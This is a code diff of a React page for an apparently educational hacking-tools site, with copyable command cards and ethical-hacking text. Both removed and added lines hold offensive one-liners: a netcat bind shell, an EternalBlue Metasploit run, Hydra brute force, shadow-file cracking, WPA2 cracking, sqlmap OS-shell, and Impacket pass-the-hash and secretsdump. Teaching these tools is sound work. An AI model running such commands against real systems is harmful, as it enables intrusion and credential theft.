-                    <CopyButton text="#!/bin/bash" copiedText={copiedText} onCopy={handleCopy} />
+                <div className="cyber-card p-4 h-100 d-flex flex-column">
+                  <h4 className="text-info"><i className="fa-solid fa-terminal me-2"></i>Bash Scripting <span className="fs-6 text-secondary ms-2">{'{Bash}'}</span></h4>
+                  <p className="text-secondary"><strong className="text-info">What it is:</strong> Writing scripts in the Bash shell to automate system tasks.</p>
+                  <p className="text-secondary flex-grow-1"><strong className="text-info">How it's used:</strong> Hackers use it to automate repetitive tasks like network scanning or parsing large data dumps. Defenders use it for system auditing and hardening.</p>
+                  <div className="d-flex align-items-start bg-dark p-3 rounded mt-3 border border-info border-opacity-25">
+                    <pre className="text-info mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`#!/bin/bash
+# Basic Security Audit Script
+echo "=== System Audit ==="
+
+echo "1. Checking root users:"
+awk -F: '$3 == 0 {print $1}' /etc/passwd
+
+echo "2. Finding SUID files:"
+find / -perm -4000 -type f 2>/dev/null | head -n 3
+
+echo "3. Open network ports:"
+ss -tuln`}
+                    </pre>
+                    <CopyButton text={`#!/bin/bash\n# Basic Security Audit Script\necho "=== System Audit ==="\n\necho "1. Checking root users:"\nawk -F: '$3 == 0 {print $1}' /etc/passwd\n\necho "2. Finding SUID files:"\nfind / -perm -4000 -type f 2>/dev/null | head -n 3\n\necho "3. Open network ports:"\nss -tuln`} copiedText={copiedText} onCopy={handleCopy} />
                   </div>
                 </div>
               </div>
               <div className="col-md-6">
-                <div className="cyber-card p-4 h-100">
-                  <h4 className="text-warning"><i className="fa-solid fa-user-secret me-2"></i>File Permissions (Chmod/Chown)</h4>
+                <div className="cyber-card p-4 h-100 d-flex flex-column">
+                  <h4 className="text-warning"><i className="fa-solid fa-user-secret me-2"></i>File Permissions (Chmod/Chown) <span className="fs-6 text-secondary ms-2">{'{Bash}'}</span></h4>
                   <p className="text-secondary"><strong className="text-warning">What it is:</strong> The system governing who can read, write, or execute files.</p>
-                  <p className="text-secondary"><strong className="text-warning">How it's used:</strong> Misconfigured permissions (like SUID bits set on sensitive binaries) are a primary way hackers achieve Privilege Escalation (becoming the 'root' user).</p>
-                  <div className="d-flex align-items-center bg-dark p-2 rounded mt-2 border border-warning border-opacity-25">
-                    <code className="text-warning mb-0" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>chmod +s /usr/bin/find</code>
-                    <CopyButton text="chmod +s /usr/bin/find" copiedText={copiedText} onCopy={handleCopy} />
+                  <p className="text-secondary flex-grow-1"><strong className="text-warning">How it's used:</strong> Misconfigured permissions (like SUID bits set on sensitive binaries) are a primary way hackers achieve Privilege Escalation (becoming the 'root' user).</p>
+                  <div className="d-flex align-items-start bg-dark p-3 rounded mt-3 border border-warning border-opacity-25">
+                    <pre className="text-warning mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# 1. View file permissions
+ls -la /etc/shadow
+
+# 2. Secure sensitive files (Root read/write only)
+chmod 600 /etc/shadow
+chown root:root /etc/shadow
+
+# 3. Find files with dangerous SUID bits set
+find / -perm -u=s -type f 2>/dev/null`}
+                    </pre>
+                    <CopyButton text={`# 1. View file permissions\nls -la /etc/shadow\n\n# 2. Secure sensitive files (Root read/write only)\nchmod 600 /etc/shadow\nchown root:root /etc/shadow\n\n# 3. Find files with dangerous SUID bits set\nfind / -perm -u=s -type f 2>/dev/null`} copiedText={copiedText} onCopy={handleCopy} />
                   </div>
                 </div>
               </div>
               <div className="col-md-6">
-                <div className="cyber-card p-4 h-100">
-                  <h4 className="text-danger"><i className="fa-solid fa-network-wired me-2"></i>Netcat (nc)</h4>
+                <div className="cyber-card p-4 h-100 d-flex flex-column">
+                  <h4 className="text-danger"><i className="fa-solid fa-network-wired me-2"></i>Netcat (nc) <span className="fs-6 text-secondary ms-2">{'{Bash}'}</span></h4>
                   <p className="text-secondary"><strong className="text-danger">What it is:</strong> A versatile networking utility that reads and writes data across network connections.</p>
-                  <p className="text-secondary"><strong className="text-danger">How it's used:</strong> Known as the "hacker's Swiss Army knife," it's used to set up bind/reverse shells, transfer files, or manually interact with network services (like HTTP/SMTP).</p>
-                  <div className="d-flex align-items-center bg-dark p-2 rounded mt-2 border border-danger border-opacity-25">
-                    <code className="text-danger mb-0" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>nc -lvnp 4444 -e /bin/bash</code>
-                    <CopyButton text="nc -lvnp 4444 -e /bin/bash" copiedText={copiedText} onCopy={handleCopy} />
+                  <p className="text-secondary flex-grow-1"><strong className="text-danger">How it's used:</strong> Known as the "hacker's Swiss Army knife," it's used to set up bind/reverse shells, transfer files, or manually interact with network services.</p>
+                  <div className="d-flex align-items-start bg-dark p-3 rounded mt-3 border border-danger border-opacity-25">
+                    <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# 1. Listen for inbound connections
+nc -lvnp 4444
+
+# 2. Connect to a listener (or banner grabbing)
+nc 192.168.1.100 80
+
+# 3. Simple port scanning (Verbose, Zero-I/O)
+nc -vz 192.168.1.100 20-80`}
+                    </pre>
+                    <CopyButton text={`# 1. Listen for inbound connections\nnc -lvnp 4444\n\n# 2. Connect to a listener (or banner grabbing)\nnc 192.168.1.100 80\n\n# 3. Simple port scanning (Verbose, Zero-I/O)\nnc -vz 192.168.1.100 20-80`} copiedText={copiedText} onCopy={handleCopy} />
                   </div>
                 </div>
               </div>
               <div className="col-md-6">
-                <div className="cyber-card p-4 h-100">
-                  <h4 className="text-success"><i className="fa-solid fa-eye me-2"></i>Cron Jobs</h4>
+                <div className="cyber-card p-4 h-100 d-flex flex-column">
+                  <h4 className="text-success"><i className="fa-solid fa-eye me-2"></i>Cron Jobs <span className="fs-6 text-secondary ms-2">{'{Bash}'}</span></h4>
                   <p className="text-secondary"><strong className="text-success">What it is:</strong> A time-based job scheduler in Unix-like operating systems.</p>
-                  <p className="text-secondary"><strong className="text-success">How it's used:</strong> Hackers use cron jobs to establish persistence (e.g., scheduling a script to run every 5 minutes to reconnect a reverse shell if it gets disconnected) or to exploit poorly secured scripts that run automatically.</p>
-                  <div className="d-flex align-items-center bg-dark p-2 rounded mt-2 border border-success border-opacity-25">
-                    <code className="text-success mb-0" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>crontab -e</code>
-                    <CopyButton text="crontab -e" copiedText={copiedText} onCopy={handleCopy} />
+                  <p className="text-secondary flex-grow-1"><strong className="text-success">How it's used:</strong> Hackers use it to establish persistence. Administrators use it to automate secure backups and continuous monitoring tasks.</p>
+                  <div className="d-flex align-items-start bg-dark p-3 rounded mt-3 border border-success border-opacity-25">
+                    <pre className="text-success mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# 1. Edit the current user's crontab
+crontab -e
+
+# 2. List current scheduled jobs
+crontab -l
+
+# 3. Example Cron: Run backup every day at 2 AM
+# Minute Hour Day Month DayOfWeek Command
+0 2 * * * /opt/scripts/secure_backup.sh`}
+                    </pre>
+                    <CopyButton text={`# 1. Edit the current user's crontab\ncrontab -e\n\n# 2. List current scheduled jobs\ncrontab -l\n\n# 3. Example Cron: Run backup every day at 2 AM\n# Minute Hour Day Month DayOfWeek Command\n0 2 * * * /opt/scripts/secure_backup.sh`} copiedText={copiedText} onCopy={handleCopy} />
                   </div>
                 </div>
               </div>
@@ -821,61 +902,115 @@ export default function App() {
                   <div className="row g-3">
                     <div className="col-md-4">
                       <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
-                        <strong className="text-danger d-block mb-1">1. Metasploit Framework</strong>
-                        <small className="text-secondary mb-3 flex-grow-1">Used for developing and executing exploit code against a remote target machine. It is the gold standard for exploitation.</small>
-                        <div className="d-flex align-items-center bg-dark p-2 rounded mt-auto border border-danger border-opacity-25">
-                          <code className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>msfconsole</code>
-                          <CopyButton text="msfconsole" copiedText={copiedText} onCopy={handleCopy} />
+                        <strong className="text-danger d-block mb-1">1. Hydra <span className="fs-6 text-secondary ms-1 fw-normal">{'{Bash}'}</span></strong>
+                        <small className="text-secondary mb-3 flex-grow-1">A fast network logon cracker supporting numerous protocols, commonly used to brute-force SSH, FTP, or HTTP passwords.</small>
+                        <div className="d-flex align-items-start bg-dark p-3 rounded mt-auto border border-danger border-opacity-25">
+                          <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# 1. SSH brute force
+hydra -l admin -P pass.txt ssh://target
+
+# 2. FTP brute force
+hydra -L users.txt -P pass.txt ftp://target
+
+# 3. HTTP form login
+hydra target.com http-form-post "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`}
+                          </pre>
+                          <CopyButton text={`# 1. SSH brute force\nhydra -l admin -P pass.txt ssh://target\n\n# 2. FTP brute force\nhydra -L users.txt -P pass.txt ftp://target\n\n# 3. HTTP form login\nhydra target.com http-form-post "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`} copiedText={copiedText} onCopy={handleCopy} />
                         </div>
                       </div>
                     </div>
                     <div className="col-md-4">
                       <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
-                        <strong className="text-danger d-block mb-1">2. Nmap</strong>
+                        <strong className="text-danger d-block mb-1">2. Nmap <span className="fs-6 text-secondary ms-1 fw-normal">{'{Bash}'}</span></strong>
                         <small className="text-secondary mb-3 flex-grow-1">A network exploration tool and port scanner. Used to discover hosts, open ports, and running services on a network.</small>
-                        <div className="d-flex align-items-center bg-dark p-2 rounded mt-auto border border-danger border-opacity-25">
-                          <code className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>nmap -sV -p- &lt;target&gt;</code>
-                          <CopyButton text="nmap -sV -p- <target>" copiedText={copiedText} onCopy={handleCopy} />
+                        <div className="d-flex align-items-start bg-dark p-3 rounded mt-auto border border-danger border-opacity-25">
+                          <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# 1. Intense scan (OS & services)
+nmap -T4 -A -v <target>
+
+# 2. Scan specific ports
+nmap -p 80,443,8080 <target>
+
+# 3. Use vulnerability scripts
+nmap --script vuln <target>`}
+                          </pre>
+                          <CopyButton text={`# 1. Intense scan (OS & services)\nnmap -T4 -A -v <target>\n\n# 2. Scan specific ports\nnmap -p 80,443,8080 <target>\n\n# 3. Use vulnerability scripts\nnmap --script vuln <target>`} copiedText={copiedText} onCopy={handleCopy} />
                         </div>
                       </div>
                     </div>
                     <div className="col-md-4">
                       <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
-                        <strong className="text-danger d-block mb-1">3. Wireshark</strong>
+                        <strong className="text-danger d-block mb-1">3. Wireshark <span className="fs-6 text-secondary ms-1 fw-normal">{'{Bash}'}</span></strong>
                         <small className="text-secondary mb-3 flex-grow-1">A powerful network protocol analyzer. It allows hackers to capture and inspect live network traffic down to the packet level.</small>
-                        <div className="d-flex align-items-center bg-dark p-2 rounded mt-auto border border-danger border-opacity-25">
-                          <code className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>wireshark &amp;</code>
-                          <CopyButton text="wireshark &" copiedText={copiedText} onCopy={handleCopy} />
+                        <div className="d-flex align-items-start bg-dark p-3 rounded mt-auto border border-danger border-opacity-25">
+                          <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# 1. Start GUI (as root/sudo)
+wireshark &
+
+# 2. TShark CLI: Capture all on eth0
+tshark -i eth0
+
+# 3. Filter specific traffic
+tshark -r cap.pcap -Y "http.request"`}
+                          </pre>
+                          <CopyButton text={`# 1. Start GUI (as root/sudo)\nwireshark &\n\n# 2. TShark CLI: Capture all on eth0\ntshark -i eth0\n\n# 3. Filter specific traffic\ntshark -r cap.pcap -Y "http.request"`} copiedText={copiedText} onCopy={handleCopy} />
                         </div>
                       </div>
                     </div>
                     <div className="col-md-4">
                       <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
-                        <strong className="text-danger d-block mb-1">4. Aircrack-ng</strong>
+                        <strong className="text-danger d-block mb-1">4. Aircrack-ng <span className="fs-6 text-secondary ms-1 fw-normal">{'{Bash}'}</span></strong>
                         <small className="text-secondary mb-3 flex-grow-1">A suite of tools to assess WiFi network security. Hackers use it for monitoring, packet injection, and cracking WPA/WPA2 passwords.</small>
-                        <div className="d-flex align-items-center bg-dark p-2 rounded mt-auto border border-danger border-opacity-25">
-                          <code className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>airmon-ng start wlan0</code>
-                          <CopyButton text="airmon-ng start wlan0" copiedText={copiedText} onCopy={handleCopy} />
+                        <div className="d-flex align-items-start bg-dark p-3 rounded mt-auto border border-danger border-opacity-25">
+                          <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# 1. Enable monitor mode
+airmon-ng start wlan0
+
+# 2. Capture packets (Handshake)
+airodump-ng -c 6 --bssid 00:11... wlan0mon
+
+# 3. Crack captured WPA2 hash
+aircrack-ng -w wordlist.txt capture.cap`}
+                          </pre>
+                          <CopyButton text={`# 1. Enable monitor mode\nairmon-ng start wlan0\n\n# 2. Capture packets (Handshake)\nairodump-ng -c 6 --bssid 00:11... wlan0mon\n\n# 3. Crack captured WPA2 hash\naircrack-ng -w wordlist.txt capture.cap`} copiedText={copiedText} onCopy={handleCopy} />
                         </div>
                       </div>
                     </div>
                     <div className="col-md-4">
                       <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
-                        <strong className="text-danger d-block mb-1">5. John the Ripper</strong>
+                        <strong className="text-danger d-block mb-1">5. John the Ripper <span className="fs-6 text-secondary ms-1 fw-normal">{'{Bash}'}</span></strong>
                         <small className="text-secondary mb-3 flex-grow-1">An extremely fast offline password cracker. Used to brute-force or dictionary-attack hashed passwords stolen from databases.</small>
-                        <div className="d-flex align-items-center bg-dark p-2 rounded mt-auto border border-danger border-opacity-25">
-                          <code className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>john --wordlist=pass.txt hash.txt</code>
-                          <CopyButton text="john --wordlist=pass.txt hash.txt" copiedText={copiedText} onCopy={handleCopy} />
+                        <div className="d-flex align-items-start bg-dark p-3 rounded mt-auto border border-danger border-opacity-25">
+                          <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# 1. Combine passwd/shadow files
+unshadow /etc/passwd /etc/shadow > hashes
+
+# 2. Dictionary crack
+john --wordlist=rockyou.txt hashes
+
+# 3. Show cracked passwords
+john --show hashes`}
+                          </pre>
+                          <CopyButton text={`# 1. Combine passwd/shadow files\nunshadow /etc/passwd /etc/shadow > hashes\n\n# 2. Dictionary crack\njohn --wordlist=rockyou.txt hashes\n\n# 3. Show cracked passwords\njohn --show hashes`} copiedText={copiedText} onCopy={handleCopy} />
                         </div>
                       </div>
                     </div>
                     <div className="col-md-4">
                       <div className="p-3 border border-secondary rounded h-100 d-flex flex-column" style={{ background: 'rgba(255,255,255,0.02)' }}>
-                        <strong className="text-danger d-block mb-1">6. Burp Suite</strong>
+                        <strong className="text-danger d-block mb-1">6. Burp Suite <span className="fs-6 text-secondary ms-1 fw-normal">{'{Bash}'}</span></strong>
                         <small className="text-secondary mb-3 flex-grow-1">An integrated platform for web application security testing. Its proxy intercepts HTTP traffic to manipulate requests before they reach the server.</small>
-                        <div className="d-flex align-items-center bg-dark p-2 rounded mt-auto border border-danger border-opacity-25">
-                          <code className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>burpsuite</code>
-                          <CopyButton text="burpsuite" copiedText={copiedText} onCopy={handleCopy} />
+                        <div className="d-flex align-items-start bg-dark p-3 rounded mt-auto border border-danger border-opacity-25">
+                          <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# 1. Start application
+burpsuite &
+
+# 2. Set browser proxy to:
+# 127.0.0.1:8080
+
+# 3. Intercept & send to Repeater
+# (Done via GUI: Ctrl+R)`}
+                          </pre>
+                          <CopyButton text={`# 1. Start application\nburpsuite &\n\n# 2. Set browser proxy to:\n# 127.0.0.1:8080\n\n# 3. Intercept & send to Repeater\n# (Done via GUI: Ctrl+R)`} copiedText={copiedText} onCopy={handleCopy} />
                         </div>
                       </div>
                     </div>
@@ -896,104 +1031,137 @@ export default function App() {
               <div className="col-12">
                 <div className="cyber-card p-4 border-success" style={{ borderWidth: '2px' }}>
                   <h4 className="text-success mb-3"><i className="fa-solid fa-user-shield me-2"></i>What is Ethical Hacking?</h4>
-                  <p className="text-secondary mb-0">Ethical hacking is the legal and authorized practice of probing systems, networks, and applications to uncover vulnerabilities before malicious hackers can exploit them. Also known as "white-hat" hacking, it involves using the same tools and techniques as cybercriminals, but strictly with permission and for the purpose of strengthening security defenses and protecting sensitive data.</p>
+                  <p className="text-secondary mb-2"><strong className="text-light">Authorized Probing:</strong> The legal practice of testing systems, networks, and applications to uncover vulnerabilities with explicit permission from the owner.</p>
+                  <p className="text-secondary mb-2"><strong className="text-light">White-Hat Philosophy:</strong> Operating as a "white-hat" hacker means using the same tools and methodologies as malicious actors, but for defensive purposes.</p>
+                  <p className="text-secondary mb-2"><strong className="text-light">Vulnerability Mitigation:</strong> The primary goal is to identify security flaws before cybercriminals can exploit them, allowing organizations to patch weaknesses.</p>
+                  <p className="text-secondary mb-0"><strong className="text-light">Protecting Data:</strong> Ethical hacking is a critical component of strengthening security postures and ensuring the confidentiality, integrity, and availability of sensitive information.</p>
                 </div>
               </div>
             </div>
 
             <div className="row g-4">
-              <div className="col-md-6">
-                <div className="cyber-card p-4 h-100">
-                  <h4 className="text-info"><i className="fa-solid fa-spider me-2"></i>Burp Suite</h4>
-                  <p className="text-secondary"><strong className="text-info">What it is:</strong> A web vulnerability scanner and proxy tool.</p>
-                  <p className="text-secondary mb-3"><strong className="text-info">How Hackers Use It:</strong> Intercepts and modifies web traffic before it reaches the server.<br/><br/><strong className="text-info">Example:</strong> Intercepting a checkout request and changing a laptop's price from $1000 to $1 before forwarding it to the server.</p>
-                  <div className="mt-auto p-3 bg-dark rounded border border-info border-opacity-25">
-                    <div className="mb-2 border-bottom border-secondary pb-1 d-flex justify-content-between align-items-center">
-                      <strong className="text-info small">Intercepted HTTP Request (Modified)</strong>
-                      <CopyButton text={"POST /api/checkout HTTP/1.1\nHost: target-shop.local\nContent-Type: application/json\n\n{\n  \"item\": \"laptop\",\n  \"price\": 1.00\n}"} copiedText={copiedText} onCopy={handleCopy} />
-                    </div>
-                    <pre className="mb-0 text-light small" style={{ fontFamily: 'monospace', overflowX: 'auto' }}>
-                      <span className="text-danger fw-bold">POST</span> /api/checkout HTTP/1.1<br/>
-                      Host: target-shop.local<br/>
-                      Content-Type: application/json<br/>
-                      <br/>
-                      <span className="text-secondary">{"{"}</span><br/>
-                      &nbsp;&nbsp;"item": "laptop",<br/>
-                      &nbsp;&nbsp;"price": <span className="text-danger fw-bold text-decoration-line-through">1000.00</span> <span className="text-success fw-bold">1.00</span><br/>
-                      <span className="text-secondary">{"}"}</span>
+              <div className="col-md-6 col-lg-4">
+                <div className="cyber-card p-4 h-100 d-flex flex-column">
+                  <i className="fa-brands fa-python text-warning fa-2x mb-3"></i>
+                  <h4 className="text-warning">SQLMap <span className="fs-6 text-secondary ms-2">{'{Python}'}</span></h4>
+                  <p className="text-secondary"><strong className="text-warning">What it is:</strong> An open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.</p>
+                  <p className="text-secondary flex-grow-1"><strong className="text-warning">How it's used:</strong> Used to map databases, dump tables, and potentially take over database servers via SQL injection.</p>
+                  <div className="d-flex align-items-start bg-dark p-3 rounded border border-warning border-opacity-25 mt-3">
+                    <pre className="text-warning mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# Basic SQL injection scan
+sqlmap -u "http://target.com/page.php?id=1"
+
+# Dump database tables
+sqlmap -u "http://target.com/page.php?id=1" --tables
+
+# Get interactive OS shell
+sqlmap -u "http://target.com/page.php?id=1" --os-shell`}
                     </pre>
+                    <CopyButton text={`# Basic SQL injection scan\nsqlmap -u "http://target.com/page.php?id=1"\n\n# Dump database tables\nsqlmap -u "http://target.com/page.php?id=1" --tables\n\n# Get interactive OS shell\nsqlmap -u "http://target.com/page.php?id=1" --os-shell`} copiedText={copiedText} onCopy={handleCopy} />
                   </div>
                 </div>
               </div>
-              <div className="col-md-6">
+
+              <div className="col-md-6 col-lg-4">
                 <div className="cyber-card p-4 h-100 d-flex flex-column">
-                  <h4 className="text-warning"><i className="fa-solid fa-network-wired me-2"></i>Nmap (Network Mapper)</h4>
-                  <p className="text-secondary"><strong className="text-warning">What it is:</strong> A free and open-source utility for network discovery and security auditing.</p>
-                  <p className="text-secondary mb-3"><strong className="text-warning">How Hackers Use It:</strong> Scans networks to find open ports, running services, and OS details.<br/><br/><strong className="text-warning">Example:</strong> Scanning an IP and finding Port 21 (FTP) open with an outdated, vulnerable version of FileZilla running.</p>
-                  <div className="mt-auto p-3 bg-dark rounded border border-warning border-opacity-25">
-                    <div className="mb-2 border-bottom border-secondary pb-1 d-flex justify-content-between align-items-center">
-                      <strong className="text-warning small">Bash Terminal</strong>
-                      <CopyButton text={"nmap -sV -sC -p 21,80 192.168.1.105"} copiedText={copiedText} onCopy={handleCopy} />
-                    </div>
-                    <pre className="mb-0 text-light small" style={{ fontFamily: 'monospace', overflowX: 'auto' }}>
-                      <span className="text-warning fw-bold">root@kali:~#</span> nmap -sV -sC -p 21,80 192.168.1.105<br/>
-                      <br/>
-                      <span className="text-secondary">Starting Nmap 7.93...</span><br/>
-                      PORT   STATE SERVICE VERSION<br/>
-                      21/tcp open  ftp     <span className="text-danger fw-bold">vsftpd 2.3.4</span><br/>
-                      80/tcp open  http    Apache httpd 2.4.41<br/>
-                      <br/>
-                      <span className="text-success">Nmap done: 1 IP address (1 host up) scanned</span>
+                  <i className="fa-brands fa-python text-info fa-2x mb-3"></i>
+                  <h4 className="text-info">Scapy <span className="fs-6 text-secondary ms-2">{'{Python}'}</span></h4>
+                  <p className="text-secondary"><strong className="text-info">What it is:</strong> A powerful interactive packet manipulation program and Python library.</p>
+                  <p className="text-secondary flex-grow-1"><strong className="text-info">How it's used:</strong> Used to forge, decode, capture, and analyze packets of a wide number of network protocols.</p>
+                  <div className="d-flex align-items-start bg-dark p-3 rounded border border-info border-opacity-25 mt-3">
+                    <pre className="text-info mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# Start interactive shell
+scapy
+
+# Send crafted ICMP ping
+>>> send(IP(dst="192.168.1.1")/ICMP())
+
+# Sniff 10 packets on eth0
+>>> sniff(iface="eth0", count=10)`}
                     </pre>
+                    <CopyButton text={`# Start interactive shell\nscapy\n\n# Send crafted ICMP ping\n>>> send(IP(dst="192.168.1.1")/ICMP())\n\n# Sniff 10 packets on eth0\n>>> sniff(iface="eth0", count=10)`} copiedText={copiedText} onCopy={handleCopy} />
                   </div>
                 </div>
               </div>
-              <div className="col-md-6">
+
+              <div className="col-md-6 col-lg-4">
                 <div className="cyber-card p-4 h-100 d-flex flex-column">
-                  <h4 className="text-danger"><i className="fa-brands fa-metapush me-2"></i>Metasploit Framework</h4>
-                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> A penetration testing framework that makes hacking simple.</p>
-                  <p className="text-secondary mb-3"><strong className="text-danger">How Hackers Use It:</strong> Uses pre-written exploit code to attack known software vulnerabilities.<br/><br/><strong className="text-danger">Example:</strong> Selecting the 'EternalBlue' exploit to target an unpatched Windows machine, granting remote command line access.</p>
-                  <div className="mt-auto p-3 bg-dark rounded border border-danger border-opacity-25">
-                    <div className="mb-2 border-bottom border-secondary pb-1 d-flex justify-content-between align-items-center">
-                      <strong className="text-danger small">MSF Console</strong>
-                      <CopyButton text={"use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit"} copiedText={copiedText} onCopy={handleCopy} />
-                    </div>
-                    <pre className="mb-0 text-light small" style={{ fontFamily: 'monospace', overflowX: 'auto' }}>
-                      <span className="text-danger fw-bold">msf6 &gt;</span> use exploit/windows/smb/ms17_010_eternalblue<br/>
-                      <span className="text-danger fw-bold">msf6 exploit(...) &gt;</span> set RHOSTS 10.0.0.50<br/>
-                      <span className="text-danger fw-bold">msf6 exploit(...) &gt;</span> set PAYLOAD windows/x64/meterpreter/reverse_tcp<br/>
-                      <span className="text-danger fw-bold">msf6 exploit(...) &gt;</span> exploit<br/>
-                      <br/>
-                      <span className="text-info">[*]</span> Started reverse TCP handler on 10.0.0.5:4444<br/>
-                      <span className="text-success fw-bold">[+]</span> WIN - target successfully breached.<br/>
-                      <span className="text-danger fw-bold">meterpreter &gt;</span> getuid<br/>
-                      Server username: <span className="text-warning">NT AUTHORITY\SYSTEM</span>
+                  <i className="fa-brands fa-python text-danger fa-2x mb-3"></i>
+                  <h4 className="text-danger">Impacket <span className="fs-6 text-secondary ms-2">{'{Python}'}</span></h4>
+                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> A collection of Python classes for working with network protocols.</p>
+                  <p className="text-secondary flex-grow-1"><strong className="text-danger">How it's used:</strong> Frequently used by attackers for interacting with Windows domains, extracting hashes, and executing commands via Pass-the-Hash.</p>
+                  <div className="d-flex align-items-start bg-dark p-3 rounded border border-danger border-opacity-25 mt-3">
+                    <pre className="text-danger mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# Pass the Hash execution
+psexec.py administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634
+
+# Extract domain credentials
+secretsdump.py domain.local/admin:password@192.168.1.10`}
                     </pre>
+                    <CopyButton text={`# Pass the Hash execution\npsexec.py administrator@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634\n\n# Extract domain credentials\nsecretsdump.py domain.local/admin:password@192.168.1.10`} copiedText={copiedText} onCopy={handleCopy} />
                   </div>
                 </div>
               </div>
-              <div className="col-md-6">
+
+              <div className="col-md-6 col-lg-4">
                 <div className="cyber-card p-4 h-100 d-flex flex-column">
-                  <h4 className="text-success"><i className="fa-solid fa-key me-2"></i>John the Ripper / Hashcat</h4>
-                  <p className="text-secondary"><strong className="text-success">What it is:</strong> Advanced password cracking tools.</p>
-                  <p className="text-secondary mb-3"><strong className="text-success">How Hackers Use It:</strong> Rapidly guesses passwords to reverse encrypted (hashed) password files.<br/><br/><strong className="text-success">Example:</strong> Using a stolen database and the 'rockyou' dictionary list to crack a user's hashed password back to "password123".</p>
-                  <div className="mt-auto p-3 bg-dark rounded border border-success border-opacity-25">
-                    <div className="mb-2 border-bottom border-secondary pb-1 d-flex justify-content-between align-items-center">
-                      <strong className="text-success small">Bash Terminal</strong>
-                      <CopyButton text={"john --wordlist=rockyou.txt hashes.txt"} copiedText={copiedText} onCopy={handleCopy} />
-                    </div>
-                    <pre className="mb-0 text-light small" style={{ fontFamily: 'monospace', overflowX: 'auto' }}>
-                      <span className="text-success fw-bold">root@kali:~#</span> john --wordlist=rockyou.txt hashes.txt<br/>
-                      <br/>
-                      <span className="text-secondary">Using default input encoding: UTF-8</span><br/>
-                      <span className="text-secondary">Loaded 1 password hash (bcrypt)</span><br/>
-                      <span className="text-secondary">Press 'q' or Ctrl-C to abort...</span><br/>
-                      <br/>
-                      <span className="text-warning fw-bold">password123</span>      <span className="text-secondary">(admin)</span><br/>
-                      <br/>
-                      <span className="text-success">1g 0:00:00:04 DONE 0.222g/s 345p/s</span><br/>
-                      <span className="text-secondary">Use "--show" to display cracked passwords</span>
+                  <i className="fa-brands fa-python text-success fa-2x mb-3"></i>
+                  <h4 className="text-success">Dirsearch <span className="fs-6 text-secondary ms-2">{'{Python}'}</span></h4>
+                  <p className="text-secondary"><strong className="text-success">What it is:</strong> A mature command-line tool designed to brute force directories and files in web servers.</p>
+                  <p className="text-secondary flex-grow-1"><strong className="text-success">How it's used:</strong> Used by attackers during reconnaissance to map out hidden pathways, admin panels, and unlinked files on a web application.</p>
+                  <div className="d-flex align-items-start bg-dark p-3 rounded border border-success border-opacity-25 mt-3">
+                    <pre className="text-success mb-0 small" style={{ flex: 1, whiteSpace: 'pre-wrap', overflowX: 'auto', margin: 0, fontFamily: 'monospace' }}>
+{`# Basic directory scan
+python3 dirsearch.py -u "http://target.com"
+
+# Scan with extensions
+python3 dirsearch.py -u "http://target.com" -e php,html,txt
+
